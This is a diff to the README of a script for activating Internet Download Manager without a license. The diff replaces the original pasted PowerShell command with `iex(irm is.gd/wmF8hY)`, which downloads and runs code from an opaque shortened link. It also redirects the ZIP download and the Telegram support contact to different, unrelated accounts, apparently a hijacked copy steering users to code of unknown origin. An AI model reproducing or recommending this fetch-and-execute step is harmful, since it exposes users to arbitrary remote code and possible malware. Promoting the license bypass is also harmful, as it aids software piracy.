@@ -27,13 +27,13 @@ After that follow the below steps to activate it.
 
 * Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 * Copy-paste the below code and press enter
-*`iex(irm is.gd/idm_reset)`
+*`iex(irm is.gd/wmF8hY)`
 * You will see the activation options, follow the on-screen instructions.
 * That’s all.
 
 # Method 2 - Traditional
 
-* Download the file from [GitHub](https://github.com/lstprjct/IDM-Activation-Script/archive/refs/heads/main.zip)
+* Download the file from [GitHub](https://github.com/movielink999/idmprokeyarchive/refs/heads/main.zip)
 * Right-click on the downloaded zip file and extract
 * In the extracted folder, run the file named `IAS.cmd`
 * You will see the activation options, and follow onscreen instructions.
@@ -71,8 +71,8 @@ After that follow the below steps to activate it.
 
 # Troubleshoot
 * Browser Integration Fix: [Chrome](https://www.internetdownloadmanager.com/register/new_faq/bi9.html) - [Firefox](https://www.internetdownloadmanager.com/register/new_faq/bi4.html)
-* Reach out to us on [Telegram](https://t.me/ModByPiash) with an error screenshot.
-[![](https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/512px-Telegram_logo.svg.png)](https://t.me/ModByPiash)
+* Reach out to us on [Telegram](https://t.me/zeroearning01) with an error screenshot.
+[![](https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/512px-Telegram_logo.svg.png)](https://t.me/zeroearning01)
 
 # Changelog
 ## v1.2
